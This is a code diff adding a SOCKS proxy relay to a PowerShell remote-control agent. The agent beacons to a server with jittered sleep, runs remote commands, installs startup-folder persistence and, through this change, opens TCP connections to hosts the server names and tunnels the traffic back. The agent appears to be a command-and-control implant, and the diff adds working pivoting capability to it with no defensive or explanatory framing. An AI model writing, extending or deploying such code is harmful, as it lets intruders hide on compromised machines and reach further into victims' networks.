@@ -85,6 +85,8 @@ $script:RmmEverRegistered = $false
 $script:RmmVerbose = [bool]$verboseHttp
 $script:UsePersistentHttp = [bool]$persistentHttp
 $script:RmmShellCwd = (Get-Location).Path
+$script:RmmSocksEnabled = $false
+$script:RmmSocksConnections = @{}
 
 if ($script:UsePersistentHttp) {
     $script:RmmCookieContainer = New-Object System.Net.CookieContainer
@@ -579,6 +581,103 @@ function Send-RmmTextResult {
     Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
 }
 
+function Stop-RmmSocksRelay {
+    foreach ($id in @($script:RmmSocksConnections.Keys)) {
+        $tcp = $script:RmmSocksConnections[$id]
+        if ($tcp) {
+            try { $tcp.Close() } catch { }
+        }
+        $script:RmmSocksConnections.Remove($id) | Out-Null
+    }
+    $script:RmmSocksEnabled = $false
+}
+
+function Invoke-RmmSocksCycle {
+    param([hashtable]$Headers)
+    if (-not $script:RmmSocksEnabled) { return }
+    $pollUrl = "$u/socks?id=$sessionId"
+    $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
+    if ($null -eq $poll) { return }
+    $tasks = @()
+    if ($poll -is [string]) {
+        try { $poll = $poll | ConvertFrom-Json } catch { return }
+    }
+    if ($poll.tasks) { $tasks = @($poll.tasks) }
+    $responses = New-Object System.Collections.ArrayList
+    foreach ($task in $tasks) {
+        $op = [string]$task.op
+        $tid = [string]$task.id
+        if (-not $tid) { continue }
+        if ($op -eq 'connect') {
+            $destHost = [string]$task.host
+            $port = [int]$task.port
+            try {
+                $tcp = New-Object System.Net.Sockets.TcpClient
+                $tcp.ReceiveTimeout = 5000
+                $tcp.SendTimeout = 5000
+                $tcp.Connect($destHost, $port)
+                $script:RmmSocksConnections[$tid] = $tcp
+                [void]$responses.Add(@{ id = $tid; op = 'ok' })
+            } catch {
+                [void]$responses.Add(@{ id = $tid; op = 'error'; msg = $_.Exception.Message })
+            }
+        }
+        elseif ($op -eq 'send') {
+            $tcp = $script:RmmSocksConnections[$tid]
+            if (-not $tcp) { continue }
+            try {
+                $raw = [Convert]::FromBase64String([string]$task.data_b64)
+                $stream = $tcp.GetStream()
+                $stream.Write($raw, 0, $raw.Length)
+            } catch {
+                try { $tcp.Close() } catch { }
+                $script:RmmSocksConnections.Remove($tid) | Out-Null
+                [void]$responses.Add(@{ id = $tid; op = 'closed' })
+            }
+        }
+        elseif ($op -eq 'close') {
+            $tcp = $script:RmmSocksConnections[$tid]
+            if ($tcp) {
+                try { $tcp.Close() } catch { }
+            }
+            $script:RmmSocksConnections.Remove($tid) | Out-Null
+        }
+    }
+    foreach ($tid in @($script:RmmSocksConnections.Keys)) {
+        $tcp = $script:RmmSocksConnections[$tid]
+        if (-not $tcp) { continue }
+        try {
+            if (-not $tcp.Connected) {
+                $script:RmmSocksConnections.Remove($tid) | Out-Null
+                [void]$responses.Add(@{ id = $tid; op = 'closed' })
+                continue
+            }
+            $stream = $tcp.GetStream()
+            if ($stream.DataAvailable) {
+                $buf = New-Object byte[] 16384
+                $n = $stream.Read($buf, 0, $buf.Length)
+                if ($n -le 0) {
+                    $tcp.Close()
+                    $script:RmmSocksConnections.Remove($tid) | Out-Null
+                    [void]$responses.Add(@{ id = $tid; op = 'closed' })
+                } else {
+                    $chunk = [Convert]::ToBase64String($buf, 0, $n)
+                    [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $chunk })
+                }
+            }
+        } catch {
+            try { $tcp.Close() } catch { }
+            $script:RmmSocksConnections.Remove($tid) | Out-Null
+            [void]$responses.Add(@{ id = $tid; op = 'closed' })
+        }
+    }
+    if ($responses.Count -gt 0) {
+        $body = @{ responses = @($responses) } | ConvertTo-Json -Compress -Depth 6
+        $postUrl = "$u/socks?id=$sessionId"
+        Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
+    }
+}
+
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
 function ConvertTo-RmmPlainText {
     param([object[]]$Chunks)
@@ -832,8 +931,14 @@ while (-not $registered) {
 # Main loop
 while ($true) {
     try {
-        # Add jitter before each poll cycle
-        $actualSleep = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
+        # Add jitter before each poll cycle (shorter interval while SOCKS relay is active)
+        if ($script:RmmSocksEnabled) {
+            $socksBase = [Math]::Min(2, $baseSleepSeconds)
+            $socksJitter = [Math]::Min(15, $jitterPercent)
+            $null = Get-JitteredSleep -baseSeconds $socksBase -jitterPercent $socksJitter
+        } else {
+            $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
+        }
 
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
@@ -1041,6 +1146,16 @@ while ($true) {
                 Write-Host "[+] Persistence installed" -ForegroundColor Green
                 }
             }
+            elseif ($command -eq "__SOCKS_START__") {
+                $script:RmmSocksEnabled = $true
+                Send-RmmTextResult -CommandLine '__SOCKS_START__' -Text 'SOCKS relay enabled on agent' -Headers $headers
+                Write-Host "[+] SOCKS relay enabled (fast beacon + /socks polls)" -ForegroundColor Green
+            }
+            elseif ($command -eq "__SOCKS_STOP__") {
+                Stop-RmmSocksRelay
+                Send-RmmTextResult -CommandLine '__SOCKS_STOP__' -Text 'SOCKS relay stopped on agent' -Headers $headers
+                Write-Host "[*] SOCKS relay stopped on agent" -ForegroundColor Yellow
+            }
             elseif ($command -eq "__REMOVE_PERSIST__") {
                 # Remove persistence
                 $startupDir = [Environment]::GetFolderPath('Startup')
@@ -1071,6 +1186,10 @@ while ($true) {
                 Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                 Write-Host "[+] Result sent to RMM" -ForegroundColor Green
             }
+        }
+
+        if ($script:RmmSocksEnabled) {
+            Invoke-RmmSocksCycle -Headers $headers
         }
         
     } catch {
